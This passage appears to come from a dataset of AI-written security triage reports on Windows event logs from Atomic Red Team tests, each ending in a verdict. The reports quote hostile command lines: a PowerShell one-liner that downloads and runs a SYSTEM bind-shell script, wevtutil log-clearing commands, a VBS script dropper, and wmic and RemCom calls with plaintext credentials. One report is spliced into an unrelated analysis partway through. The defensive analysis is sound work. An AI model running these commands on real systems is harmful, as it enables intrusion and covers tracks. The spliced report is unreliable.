   - Multiple entries in the Sysmon logs are linked to the execution of `powershell.exe` with the same malicious command noted in the PowerShell logs, further corroborating the suspicious PowerShell activity.
   - The consecutive use of `wevtutil.exe` for log clearing in Security, System, and PowerShell events is outlined which again corresponds to log manipulation typically seen in post-compromise scenario.

4. **EdgeUpdate Executions**:
   - Although `MicrosoftEdgeUpdate.exe` runs as `NT AUTHORITY\SYSTEM`, which is typical for system-level operations, the timing of these logs following suspicious activity and log deletions should be closely examined to ensure this is not a masquerading attempt or exploitation of legitimate executables (Living off the Land Binaries - LOLBins).

### Assessment:

- Clear indicators of compromised activity exist within these logs due to intentional log clearing and the execution of suspicious PowerShell commands downloading and running potentially malicious scripts.
- The behavior aligns with typical post-exploitation activities where an attacker seeks to execute payloads undetected and clear traces from event logs.

### Conclusion: **MALICIOUS**

### Recommendations:

1. **Immediate Incident Response**:
   - Isolate the affected host to prevent further compromise or lateral movement.
   - Conduct a forensic analysis to determine the extent of the compromise and identify any other affected systems.
   - Revert any changes made by the attack, including disabling any persistent mechanisms deployed.
  
2. **Enhance Monitoring**:
   - Increase monitoring for suspicious PowerShell command usage and execution.
   - Implement alerts for log clearing events, especially from privileged accounts like `admin_test`.

3. **Hardening Measures**:
   - Apply hardening measures to minimize script-based attacks, such as enforcing PowerShell Constrained Language Mode and deploying endpoint detection and response (EDR) solutions.
   - Conduct regular security awareness training to reduce the risk of macro-based attacks.

4. **Review Account Activity**:
   - Audit the credentials of the `admin_test` account and reset passwords as appropriate.
   - Review and restrict unnecessary privileges that could facilitate similar compromises in the future."
Command prompt writing script to file then executes it,"Upon reviewing the provided event logs, several entries stand out as potentially suspicious activities that may indicate malicious behavior or compromise on the host, Server002.

### Analysis

1. **Event Log Clearing**
   - **Event ID 1102 from Security Log and Event ID 104 from System Log**: These events indicate that logs for several Windows channels (Security, Sysmon/Operational, Application, System, Windows PowerShell) were cleared. This action was taken by the user `admin_test` on `Server002`. Clearing event logs can be a common tactic used by attackers to cover their tracks after a compromise.

2. **Unusual Usage of `wevtutil.exe`**
   - Multiple entries in the Sysmon logs are showing the execution of `wevtutil.exe` with the `cl` (clear) command for various logs:
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`
   - These operations are executed by `admin_test`, suggesting the user is intentionally clearing logs from a high privilege account. Although `wevtutil.exe` is a legitimate Windows utility, its use in bulk log clearance without authorization is suspicious and aligns with attacker behavior.

3. **Command Execution and Scripting Behavior**
   - The creation and execution of scripts followed by the command line usage of `cmd.exe` and `wscript.exe` to execute what appears to be a script called `AtomicTest.vbs` is noted. The manner in which this operation is conducted (using `cmd.exe` to echo a script and then utilizing `wscript` to execute it) is characteristic of script-based attacks aiming to elevate privileges or maintain persistence. This aligns with the execution of:
     - `""CommandLine"":""\""cmd.exe\"" /c c:\\windows\\system32\\cmd.exe /c cd /d %%TEMP%%\\ & echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs""`
   - The repeated use of `whoami.exe` and `hostname.exe` suggests enumeration attempts by the script to understand user contexts or system information.

4. **Edge Update and Its Components**
   - Multiple entries indicate legitimate updates related to Microsoft Edge. These logs, listed under EdgeUpdate activities, appear systematic and in sequence, suggesting a scheduled update and are likely benign.

5. **Time Change Events**
   - **Event ID 4616** indicates a change in system time. While this might not directly point to a malicious action, along with other activities, it may be part of manipulation tactics for altering timestamps on a host.

### Assessment
- The combination of log clearing actions using administrative privileges, usage patterns of potentially malicious scripting, and context around enumeration and privilege influence strongly suggest that this host activity corresponds to compromise attempts.

### Resolution
- **MALICIOUS**: Given the log clearance (a major indicator of potential malicious intent), scripting behavior attempting to execute with potential evasion techniques, and the overall context of actions conducted, these logs should be flagged as definitively indicative of malicious activity.

### Guidance on How to Proceed
- **Immediate Steps:**
  - Isolate the affected host (Server002) from the network to prevent further spread or exfiltration.
  - Conduct a comprehensive forensic analysis to determine the extent of the compromise and identify any backdoors or persistence mechanisms.
  - Audit administrative accounts (`admin_test`) for unauthorized access or changes and enforce password changes.
  - Review and strengthen log monitoring and alerting mechanisms to detect similar malicious behaviors promptly.

- **Preventive Measures:**
  - Implement stricter access controls and auditing of administrative activities.
  - Ensure software updates and patches are current to prevent exploitation of known vulnerabilities.
  - Educate users on security awareness focusing on identifying suspicious activities and proper use of administrative tools."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"### Detailed Analysis:

1. **Sysmon Logs:**
   - Several occurrences of `wevtutil.exe` execution, specifically with commands such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`. This `wevtutil cl` command is used to clear event logs, which is often suspicious because malicious actors attempt to cover their tracks by deleting logs after conducting malicious activity.
   - The process `C:\Windows\System32\conhost.exe` repeatedly appears in conjunction with `wevtutil.exe`, suggesting it is being used to provide console windows for these operations.
   
2. **PowerShell Logs:**
   - The `powershell.exe` command is executed with `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')`. This command downloads and executes a PowerShell script from the internet, indicative of potentially harmful behavior if sourced from an untrusted location. The PowerShell script is highly suspect as it suggests attempting to exploit the system via techniques that might establish unauthorized access or perform malicious actions.

3. **System Logs:**
   - Events in the system logs show multiple event logs being cleared, confirming the use of `wevtutil.exe` to clear logs, thus covering tracks. This suspicious behavior is consistent with attempts to hide evidence of unauthorized activity.

4. **Security Logs:**
   - The security logs also show that the Security log was cleared at the same time as the use of `wevtutil.exe`. This supports the assumption that previous actions are designed to obfuscate unauthorized activity.

5. **Application and Time Manipulation Logs:**
   - Regular system processes such as `sppsvc.exe`, `TrustedInstaller.exe`, and `svchost.exe` are observed, logged with standard operation contexts.
   - Time-change events indicate syncing with an external time source, which is normal for maintaining accurate server time but could obscure the timestamp trail of malicious activities.

### Assessment:
The concurrent clearing of multiple event logs (Sysmon, System, Windows PowerShell, Security) and the use of PowerShell to execute potentially harmful scripts from an external source signal an attempt at unauthorized activity likely aimed at achieving stealth and persistence. Clearing logs after potential compromise is a common tactic used by malicious actors to remove footprints.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the Windows host (Server002) from the network to prevent any further potential damage or data exfiltration.
2. **Forensic Analysis**: Perform a comprehensive digital forensic analysis on the server to capture detailed artifacts and to understand the scope and impact of the breach.
3. **Incident Response**: Initiate the organization's incident response process to identify any further compromised systems and potential mitigations.
4. **Remediation Steps**: Remove any unauthorized scripts, reset all passwords, and patch any security vulnerabilities identified during the forensic analysis.
5. **Log Monitoring Enhancement**: Implement stricter monitoring policies and increase the frequency of security log reviews to catch such activities early in the future.
6. **Security Awareness Training**: Provide additional training to administrative users to increase awareness regarding suspicious activities and safe handling of command-line tools and PowerShell."
Application uninstall using WMIC,"Upon thorough analysis of the Windows event logs provided from the PowerShell, Security, Sysmon, System, and Application logs, the following suspicious and potentially malicious activities were identified:

### Observations and Analysis:

1. **Event Log Clearing:**
   - The Security log shows an event (EventID: 1102) indicating that the Security log was cleared by the account ""admin_test"" on the host ""Server002"". This corresponds to intentional log clearing to potentially cover malicious activity. Log clearing is often associated with malicious intent as it might indicate an attempt to hide other actions undertaken on the system.

2. **Usage of `wevtutil` to Clear Logs:**
   - There are multiple events across the Sysmon logs showing the invocation of `wevtutil.exe` with the clear (`cl`) command on various logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security"". The usage of `wevtutil.exe` with the intent to clear logs without a legitimate administrative purpose or planned maintenance window strongly indicates malicious activity.

3. **PowerShell and Execution Patterns:**
   - The execution of PowerShell and the console host processes (e.g., `conhost.exe`) several times in rapid succession is concerning. Powershell is often used in automated attacks for scripting and executing malicious commands or retrieving scripts from the internet.

4. **Unexpected Commands:**
   - Execution of `hostname.exe` and `whoami.exe` appear benign at first but could be reconnaissance attempts to determine the environment's profile and operating context, possibly preparatory steps for further targeted attacks.

5. **WMIC Usage for Application Uninstallation:**
   - The logs show `wmic.exe` was used to uninstall ""Tightvnc"" via a command executed by `cmd.exe`. This command was run from a temporary directory, which could indicate a script or tool that was not deployed using traditional IT deployment mechanisms.

### Risk Assessment and Conclusion:

Given the above observations, the activity uncovered presents significant indicators of malicious behavior:
- Intentional clearing of logs without clear justification.
- Rapid invocation of system utilities often associated with malicious actions, particularly those used for reconnaissance, footprinting, or direct modifications.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Incident Response:**
   - Immediately escalate the issue to your Incident Response (IR) team for containment, eradication, and recovery procedures.
   - Ensure collection and preservation of other relevant logs and evidence for thorough investigation.
   
2. **User Account Review:**
   - Investigate and potentially disable the account ""admin_test"" until a root cause is determined.
   
3. **Monitor and Audit:**
   - Increase monitoring on ""Server002"" for any further suspicious activity and review past activity associated with the ""admin_test"" account.
   
4. **Log Integrity and Retention:**
   - Implement stricter controls and monitoring over log access and integrity, including using Security Information and Event Management (SIEM) tools to detect anomalies in real-time.

5. **System Hardening:**
   - Review and harden system configurations to prevent unauthorized use of administrative utilities like `wevtutil.exe`.

6. **Communication:**
   - Ensure that stakeholders are informed of the potential breach and are apprised of ongoing investigation efforts.

Taking swift action is critical to mitigate any potential damage and to prevent further malicious activity."
Cobalt Strike post-exploitation pipe (before 4.2),"In analyzing the provided logs for potential malicious activity, several events stand out as suspicious and warrant further investigation:

1. **Clearing of Event Logs:**
   - **Event ID 104, 1102 in System and Security logs:** Logs related to the System, Windows PowerShell, and Security channels have been cleared. The user responsible appears to be `admin_test`, and these actions are performed in quick succession. Clearing logs is a common tactic used by adversaries to cover their tracks after malicious activities.

2. **Usage of `wevtutil.exe`:**
   - **Sysmon Event ID 1** shows the execution of `wevtutil.exe` with the command-line arguments to clear the Windows event logs (e.g., `wevtutil.exe cl System`). This aligns with the log clearing events and is highly indicative of suspicious behavior.

3. **Execution of Suspicious Executables:**
   - There are entries for executables like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` in a temp directory with processes related to user `SERVER002\\admin_test`. Their usage of named pipes may suggest testing or operations typical of red team exercises or actual post-exploitation framework tactics.

4. **PowerShell Activity:**
   - The Sysmon logs indicate that `powershell.exe` was executed by `admin_test`. Although no explicit malicious command is captured in the logs, PowerShell is often used in post-exploitation activities, and its presence alongside the other suspicious activities increases concern.

5. **User Privileges:**
   - **Event ID 4672** shows that `admin_test` was granted privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which can be leveraged for privilege escalation or unauthorized system access.

6. **Unexpected Process Executions:**
   - Execution of `cmd.exe` which launched `namedpipes_executor.exe`, and other temporary executables, indicating possible stages of a penetration testing framework or unauthorized activities.

7. **Indicators of Potential Red Team Activity:**
   - The presence of executables and directories typical for tools like `AtomicRedTeam`, along with the activities seen, raises the possibility that these are part of a penetration test or a security challenge. However, without explicit confirmation of such an exercise, they remain suspect under regular operations.

Based on these findings, my assessment of the situation is as follows:

**Resolution: SUSPICIOUS**

The activities logged are suspicious and align with several tactics used in malicious operations, including log clearing and execution of potentially harmful executables. It is crucial to verify with the relevant stakeholders if any legitimate red teaming exercise was conducted. If not, an immediate security response should be initiated to investigate and mitigate any unauthorized actions and ensure that systems are not compromised. Further forensic analysis on the executables and a review of PowerShell execution history can provide more context. Additionally, reviewing user accounts and privileges, especially for `admin_test`, is advised."
Run BloodHound from local disk,"The provided event logs raise several red flags indicative of potentially malicious activity. Let's break it down:

1. **Suspicious PowerShell Activity**: 
   - There are several instances where PowerShell is executed with command lines that try to import and execute a script named `SharpHound.ps1`. SharpHound is a tool used by attackers for Active Directory reconnaissance, often associated with the BloodHound suite for gathering information about AD environments to identify attack paths.
  
2. **Log Clearing**:
   - The Security and System event logs were cleared (Event ID 1102 in the Security log, Event ID 104 in the System log) by the user `admin_test`. Log clearing is a common technique used by attackers to cover their tracks and could indicate an attempt to hide malicious activities.

3. **Wevtutil Executions**:
   - There are multiple instances where `wevtutil.exe` is used to clear event logs, which is quite suspicious when executed by a user without a legitimate reason in a short timeframe.

4. **Execution of Console Hosts (conhost.exe)**:
   - The process `conhost.exe` was started multiple times in quick succession, which can be indicative of a script or commands being executed in a manner designed to emulate typical user behavior to avoid immediate detection.

5. **High Privilege Executions**:
   - The activity, especially from `admin_test`, runs at a ""High"" integrity level, suggesting privileged access, which can be used to perform higher-level operations.

6. **Windows PowerShell Log**:
   - The PowerShell script uses `Invoke-BloodHound`, indicative of scanning or collecting information on the network, which without explicit administrative consent or notification could be considered unauthorized reconnaissance.

Based on these indicators, it's logical to classify the activities in the logs as **MALICIOUS**. The SharpHound execution attempts, log clearances, and other contextually suspicious activities demonstrate clear intent that aligns with common attack techniques used for reconnaissance and evasion.

**Guidance**:
- Immediately isolate the affected host (Server002) from the network to prevent further data exfiltration or lateral movement by the adversary.
- Conduct a detailed forensic investigation on this host to identify any other potential backdoors or malware.
- Review the permissions and recent changes for the `admin_test` account and any other accounts with administrative access to ensure they have not been compromised.
- Implement additional monitoring rules and enhance alerting for suspicious PowerShell activity and log clearing events.
- Given the potential compromise, initiate a full security audit to understand the extent and origins of this incident and ensure no other systems have been affected."

Use RemCom to execute a command on a remote host,"### Detailed Analysis

Upon review of the provided Windows event logs, there are several indicators of potentially suspicious activity that merit further investigation.

**Suspicious and Anomalous Behavior:**

1. **Log Clearing Activity:**
   - Multiple logs show evidence of the event logs being cleared (`EventID: 104` for System and Windows PowerShell logs, `EventID: 1102` for Security log). This is often associated with attempts to cover up malicious activity.
   - The user performing these actions consistently is `admin_test`, a local administrator account on `Server002`. The clearing of logs without a documented and legitimate reason is a potential red flag.

2. **Processes Executed with Elevated Privileges:**
   - A sequence of events involves `wevtutil.exe` being executed to clear logs across different channels (i.e., Sysmon, Application, Security). These actions were performed with high integrity levels by `admin_test`. This indicates a deliberate act to delete event traces.

3. **Execution of RemCom Tool:**
   - The execution of `remcom.exe` from `C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\` with possible credentials (`/user:Administrator /pwd:P@ssw0rd1`) is suspicious as it can be used for remote command execution and administrative tasks over the network.
   - RemCom is a known tool in penetration testing exercises often used in lateral movement scenarios, making it particularly concerning given it was invoked with what appears to be administrator credentials.

4. **Execution of Cmd.exe with Suspicious Command:**
   - The usage of `cmd.exe` to initiate `remcom.exe` with specified credentials in the command line indicates potential unauthorized administrative access or user emulation.

**Indicators of Malicious Activity or Compromise:**

- The log clearing actions, combined with the execution of `remcom.exe`, strongly suggest an attempt to engage in malicious activities while covering digital footprints.
- The usage of administrative credentials within command lines pointing to further malicious intent possibly focused on elevating user privileges or network exploitation.

### Assessment and Resolution

Based on the analysis, there are definite signs of suspicious and potentially malicious activity in the logs, primarily around unauthorized actions to clear logs and the execution of known penetration testing tools with administrative privileges.

### Resolution: MALICIOUS

   - Example: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
   - This is a common behavior in attempts to cover tracks or erase logs to hide malicious activity.

2. **Clearing of Event Logs**:
   - Security logs cleared (EventID 1102 in Security log).
   - System logs cleared (EventID 104 in System log).
   - This action suggests an intentional effort to erase evidence of actions performed on the host.

3. **Cmd Execution**:
   - The PowerShell and Cmd processes executed with potential payloads in a suspicious directory associated with `AtomicRedTeam`, which is a known adversary simulation toolkit.
   - Example: `""cmd.exe"" /c start ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1559.002\\bin\\DDE_Document.docx""`
   - This indicates possible execution of adversary simulation or testing capabilities against the system.

4. **Edge Update Activities**:
   - The Microsoft Edge Update processes around the same timeframe appear normal as part of their typical update checks. However, when viewed alongside other activities, it might serve as a decoy or distract from the suspicious activities happening.

5. **Windows Time Service Adjustments**:
   - Some Time Change events (EventID 1 in System log), relate to time synchronization adjustments, which could indicate attempts to create discrepancies in log timestamps but not necessarily malicious on its own.

### Assessment:
- The execution of `wevtutil.exe` to clear multiple event logs, combined with the running of `cmd` to execute files from a tool known for simulating malicious activity, strongly suggests an attempt to simulate or test attack tactics within the system.

### Guidance:
- Since the logs indicate clear evidence of suspicious and potentially malicious activity through the destruction of logs and simulated attacks, an immediate investigation is warranted.
- Ensure enhanced monitoring and logging practices.
- Conduct scans for any potential backdoors or persistence mechanisms that might have been deployed.
- Review any real-time alerting and endpoint detection and response solutions for additional suspicious activities.

### Resolution:
- **MALICIOUS**: The activities depict intentional eradication of evidence and execution of suspicious processes indicating clear signs of attempted or ongoing compromise. Immediate action is necessary to contain and investigate."
WMI Execute Local Process,"Upon examining the provided Windows event logs, several key observations and findings emerge:

### Analysis of Logs:

1. **Log Clearing Activity:**
   - The most notable suspicious activity is multiple instances of log file clearing, recorded in both the Security and System logs.
   - EventID 1102 in the Security log indicates that the security log was cleared by the user `admin_test`.
   - EventID 104 in the System log also documents the clearing of the System and Windows PowerShell event logs by the same user.

2. **Process Execution and Command Analysis:**
   - **Wevtutil.exe Usage:** There are numerous `wevtutil.exe` instances with the command `cl`, indicative of command-line actions possibly intended to clear logs. Wevtutil.exe is known for managing event logs on Windows, and these commands suggest manual clearing efforts.
   - **WMIC and CMD Usage:** Normally, the execution of `cmd.exe` with commands to create processes like `notepad.exe` via `wmic` isn't inherently malicious; however, it being done shortly after logs are cleared may imply concealment of activities or testing commands.

3. **Integrity Levels and User Privilege:**
   - All actions, especially those concerning `wevtutil.exe` and log file clearance, occur under high integrity levels and are carried out by `SERVER002\admin_test`, indicating administrative privileges.

4. **Timing of Events:**
   - The sequence and proximity of the log file clearing actions to each other, and their close timing with potential process creations via CMD and WMIC, suggest attempts to either hide these command executions or manipulations from standard log records.

### Assessment:

- **Suspicious Activities Identified:** The presence of log clearing actions is highly suspicious as malicious actors often clear logs to remove traces of their activities. Combining this with script execution through CMD and WMIC indicates potential environmental testing or unauthorized actions.
  
- **No Direct Malicious Activity Confirmed:** Although there are no explicit signs of malware or payload execution within the logs, the clearing of logs by the `admin_test` user combined with command-line activities does raise red flags about possible malicious intent.

### Conclusion:

- **Resolution: SUSPICIOUS**
  - The activities outlined, especially the repeated clearing of logs by an administrative user and the correlated use of PowerShell and command-line utilities to possibly execute or test unauthorized commands, strongly suggest this is suspicious activity. Further investigation is warranted, specifically into:
    - Verifying the legitimacy and intent of the `admin_test` user activities.
    - Checking for any additional security logs or endpoint monitoring data that could capture malicious payload execution.
    - Reviewing historical logs (if any backups exist) before they were cleared to correlate any further unauthorized actions.

### Guidance on How to Proceed:
1. **Immediate Investigation:**
   - Conduct a security assessment of the account `admin_test` and all recent activities by the user.
   - Review endpoint security solutions to determine if any non-logged actions or files might have been executed.
   - Evaluate any network or file modifications that might assist in identifying potential intrusions.

2. **Systematic Precautions:**
   - Implement enhanced logging and alerting mechanisms to prevent unnoticed log clearance in the future.
   - Enforce security best practices, such as least privilege principle and regular audits of privileged accounts and actions.

3. **If Malicious Actions Found:**
   - Engage in incident response protocols to mitigate any discovered threats, and, if necessary, involve cyber forensic teams to analyze and preserve any evidence thoroughly."
Potentially Unwanted Applications (PUA),"Upon a thorough review of the provided Windows event logs, there are several indicators of potentially malicious or suspicious activity:

1. **Event Log Clearing (Security & System Logs):**
   - In the Security log, EventID 1102 indicates that the audit log was cleared by the user `admin_test` on `Server002`.
   - Correspondingly in the System log, EventID 104 shows the log file was cleared for multiple channels, including `System` and `Windows PowerShell`, again by `admin_test`.
   - This log clearing activity is highly suspicious, as it is a common technique used by attackers to cover their tracks after a compromise.

2. **Suspicious PowerShell Activity (PowerShell Log):**
   - There are multiple entries in the PowerShell log indicating the execution of a script downloading and running a file from an untrusted source (`http://amtso.eicar.org/PotentiallyUnwanted.exe`).
   - This action is typically associated with attempts to download and execute potentially unwanted or harmful software.
   - Usage of `Invoke-WebRequest` in PowerShell to fetch and execute a binary further flags it as suspicious due to its potential use in fileless malware attacks.

3. **Sysmon Logs Indicating Anomalous Process Creation:**
   - There are several Sysmon logs (EventID 1) detailing the execution of `wevtutil.exe` with parameters for clearing logs (`cl`), which correlate with the log clearing events observed.
   - An additional Sysmon log shows the execution of `powershell.exe` with potential malicious intent, matching the suspicious PowerShell activity identified.

4. **General Indicators of Potential Compromise:**
   - The combination of cleared logs, suspicious PowerShell script executions, and system utility usage such as `wevtutil.exe` for log management are indicative of attempts to hide unauthorized activities on the system.

Considering these observations, the logs contain significant indicators of malicious activity. The execution of potentially harmful scripts and systematic clearing of logs to hide tracks are clear signs of compromise.

### Assessment:
- **Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Containment:**
   - Isolate `Server002` from the network to prevent further spreading or potential data exfiltration.
2. **In-depth Investigation:**
   - Perform a forensic investigation to determine the extent of the compromise. Analyze deleted logs, corroborating by other systems' logs to track potential lateral movement.
3. **Malware Analysis:**
   - Review the downloaded file `PotentiallyUnwanted.exe` including dynamic and static analysis to ascertain its impact.
4. **Remediation:**
   - Remove any associated malicious scripts or files and consider restoring the system from a safe backup.
5. **Security Enhancements:**
   - Implement stricter monitoring and alerting on log clearance activities and suspicious PowerShell executions.
   - Review user permissions and enforce least privilege principle, particularly for users with administrative rights.
   - Ensure proper configuration and regular update of endpoint protection mechanisms like Windows Defender.

Prompt action on these recommendations will help mitigate the identified risks and protect the network against future attacks."
ESXi - Install a custom VIB on an ESXi host,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity stand out, particularly centered around the use of `wevtutil.exe` and the event log clearing actions. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Event Log Clearing**: 
   - Multiple instances in the System and Security logs where the `wevtutil.exe` utility was used by the user `admin_test` to clear logs for `System`, `Windows PowerShell`, and `Security` channels. This is typically an attempt to cover tracks, a behavior often associated with malicious actors post-compromise.

2. **Command Line Execution:**
   - The specific command line argument `""C:\\Windows\\system32\\wevtutil.exe"" cl` denotes the use of `wevtutil` to clear logs. This is seen multiple times across different channels (`Sysmon`, `Application`, `Security`, and others).

3. **Unusual PowerShell Activity:**
   - The presence of PowerShell execution in logs without clear purpose or context, especially when associated with event logs clearing, is suspicious. PowerShell is often used by attackers for various operational tasks within a compromised environment.

4. **CMD.exe Execution with Potential Data Exfiltration Tools:**
   - Command executions involving paths like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\pscp.exe` suggest the use of PuTTY suite tools (`pscp.exe` and `plink.exe`) which could be employed for data exfiltration or establishing external connections, a tactic often used in malicious scenarios.

5. **High Privilege Operations:**
   - Multiple events of privilege assignments (Event ID 4672) and logins (Event ID 4624) indicate frequent privilege-related operations, possibly facilitating unauthorized access.

### Indicators of Malicious Activity:
- The combination of log clearing operations along with the use of potentially suspicious processes like `wevtutil`, `whoami`, and `pscp` strongly suggests post-compromise activity aimed at erasing traces and potentially exfiltrating data.

### Assessment:
The logs exhibit behaviors that are indicative of malicious intent, particularly:
- Explicit clearing of logs using `wevtutil.exe`, a classic indicator of an attacker trying to cover their tracks.
- The presence of command-line activities using tools and techniques consistent with known attack patterns (e.g., data exfiltration).

### Resolution:
- **MALICIOUS**: The logs contain clear evidence of malicious activity. The use of `wevtutil` to clear multiple logs shortly after potentially suspicious command-line processes strongly supports this conclusion.

### Recommendations:
1. **Immediate Incident Response**: Initiate a detailed incident response to ensure any active threats are contained and mitigated.
2. **Forensic Analysis**: Conduct a full forensic analysis to understand the extent of the compromise and how the malicious activities were conducted.
3. **Security Monitoring**: Tighten security monitoring, especially around PowerShell and command-line tools, to detect similar activities in the future.
4. **Consider Reimage**: If possible, consider reimaging the compromised system(s) to a known good state to eradicate any potential persistent threats.
5. **Patch and Update**: Ensure all systems are patched and updated to the latest security standards to prevent exploitation of known vulnerabilities."
WMI Execute Remote Process,"**Analysis of the Provided Logs:**

The provided Windows event logs contain multiple entries across different log categories. Here's a detailed analysis focusing on suspicious and potentially malicious activities:

**1. Log File Clearing:**
   - Event ID 1102 in the Security log indicates that the security log was cleared at 15:13:08. This action was carried out by the user 'admin_test' on 'Server002.' This often is a red flag, as clearing event logs can be an attempt to cover tracks after illicit activities. Additionally, Event ID 104 in the System log indicates that the System and Windows PowerShell logs were cleared around the same time, also by 'admin_test.'

**2. Time Alterations:**
   - Event IDs 4616 in the Security log and Event IDs 1 & 24 in the System log show alterations in the system time at 15:12:58.8501661. This activity was executed by 'svchost.exe,' a legitimate system process but also one frequently targeted by malware. Time changes can be accidental or part of more sinister tasks like attempts to evade detection by security solutions dependent on accurate timestamps.

**3. Privilege Elevation:**
   - Event ID 4672 indicates the assignment of special privileges (such as SeDebugPrivilege), which can be used to perform privileged actions on the system. This event was associated with 'admin_test' on 'Server002.'

**4. Failed Logon Attempts:**
   - Event IDs 4625 in the Security log show failed logon attempts from the user 'admin_test' trying to log in as 'Administrator' using 'WMIC.exe' around 15:12:59, which resulted in status codes 0xC000006D and 0xC000006E, meaning wrong credentials were provided. This could be part of an unauthorized attempt to access elevated privileges or lateral movement.

**5. Use of WMIC and CMD for Process Creation:**
   - The Sysmon logs capture 'cmd.exe' being used to run WMIC to create a process on the local machine using administrator credentials with explicit password exposure. This is highly unusual and suspicious, as it violates security protocols by embedding credentials in command-line arguments. The command seems to attempt the creation of 'notepad.exe' through WMIC with explicit admin credentials: `""cmd.exe"" /c wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:""127.0.0.1"" process call create notepad.exe` at 15:12:59.218.

**Conclusion:**
Based on the analysis, the logs indicate multiple suspicious activities suggesting potential compromise:

- The clearing of event logs and resetting of system time could be indicative of an attempt to erase traces of malicious activity.
- Privilege elevation and the exploitation of legitimate processes (like 'svchost.exe') for suspicious tasks further corroborate potential nefarious intent.
- Failed logon attempts using explicit administrative credentials with WMIC and CMD usage suggest attempts at privilege escalation or lateral movement.

**Assessment**: **MALICIOUS**

**Guidance on How to Proceed:**

1. **Incident Response Activation**: Initiate the incident response procedure to contain and mitigate potential threats. Ensure affected systems are isolated from the network to prevent lateral movement or data exfiltration.

2. **Forensic Analysis**: Conduct a detailed forensic analysis of the compromised host and any intermediary systems. Capture disk images for further investigation and evidence preservation.

3. **Credential Review**: Immediately change any exposed credentials and enforce a review of permissions across the network to ensure least-privilege principle adherence.

4. **Log Analysis and Monitoring**: Increase scrutiny of log data from affected systems and the network. Implement tighter logging policies and real-time monitoring to detect similar patterns.

5. **Threat Intelligence Sharing**: Share indicators of compromise with the appropriate cybersecurity authorities to aid in wider detection efforts against the potential threat actor.

By taking these actions, the organization can manage the current threat while taking steps to bolster defenses against future attempts."
NTFS Alternate Data Stream Access,"Upon analyzing the provided event logs across Sysmon, Security, PowerShell, Application, and System logs, several potentially concerning activities are identified that warrant further investigation:

1. **Frequent use of wevtutil.exe**:
   - The Sysmon logs show frequent execution of the `wevtutil.exe` tool with respective commands (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`). `wevtutil.exe` is a command-line utility that is used for managing event logs, including clearing event logs, which is a common tactic used by malicious actors to cover their tracks.

2. **Log Clearness**:
   - The Security log shows event ID 1102, indicating that the security log was cleared by the user ""admin_test"" shortly after the execution of `wevtutil`.
   - The System log reflects similar events with ID 104, indicating clearing of the System and Windows PowerShell logs by ""admin_test"".

3. **Privileged Access**:
   - The user ""admin_test"" has privileges that include `SeDebugPrivilege` and other high-level privileges which potentially enable sensitive operations typically not necessary for regular tasks.

4. **PowerShell Commands**:
   - Windows PowerShell log indicates suspicious activity involving a PowerShell script that utilizes NTFS Alternate Data Stream (ADS). The command is attempting to read data from the ADS and execute it using `Invoke-Expression`. This is a known technique for obfuscating/embedding malicious code.

5. **Use of Tools with No Clear Purpose**:
   - `HOSTNAME.EXE` is used, typically for verifying the machine’s name, which might be trivial but used alongside `whoami.exe`, often in attacks to verify user contexts.
   - Presence and execution of `powershell.exe` with a script aimed at executing command content from a non-standard source such as ADS should be considered suspicious.

6. **Installation Activities**:
   - There are a few events related to the Microsoft Edge installer, indicating activity regarding software update processes. While not inherently suspicious, combined with the other evidence it could be indicative of attempts to compromise legitimate software processes for malicious purpose.

### Assessment
Given the combination of these activities, this log evidence exhibits significant signs of malicious intent:
- The clearing of key logs is a strong indicator of an attempt to hide activities.
- The use of `wevtutil` to clear logs and PowerShell to execute potentially malicious scripts using obfuscated techniques (ADS) hints at a sophisticated attempt to perform unauthorized or harmful activities while remaining under the radar.

### Resolution
**MALICIOUS** - The logs contain activity strongly indicating malicious intent, especially the tampering with event logs, suspicious PowerShell execution, and the use of privileged access.

### Guidance
Proceed with the following actions:
- Immediately isolate the affected host (Server002) from the network to prevent any potential lateral movement or data exfiltration.
- Conduct a thorough forensic analysis to identify any additional indicators of compromise and to confirm the nature and extent of the malicious activity.
- Review and enhance monitoring and logging configurations to reduce susceptibility to similar activities.
- Evaluate account usage and reset credentials associated with high-privilege users, specifically the ""admin_test"" account.
- Verify all security patch levels, focusing on Windows components and third-party software such as browsers.
- Consider performing a comprehensive threat-hunting exercise across the environment, as these actions might indicate a broader campaign."
Suspicious Execution via Windows Command Shell,"Upon analysis of the provided event logs, several suspicious activities were identified, which require further investigation. A detailed look into the logs reveals:

1. **Log Clearing Events**:
   - Multiple instances of log clearing were observed. Specifically, the Security, System, and Windows PowerShell logs were cleared by the user `admin_test`. 
   - Event IDs 1102 (Security Log) and 104 (System Log) indicate that these logs have been cleared.
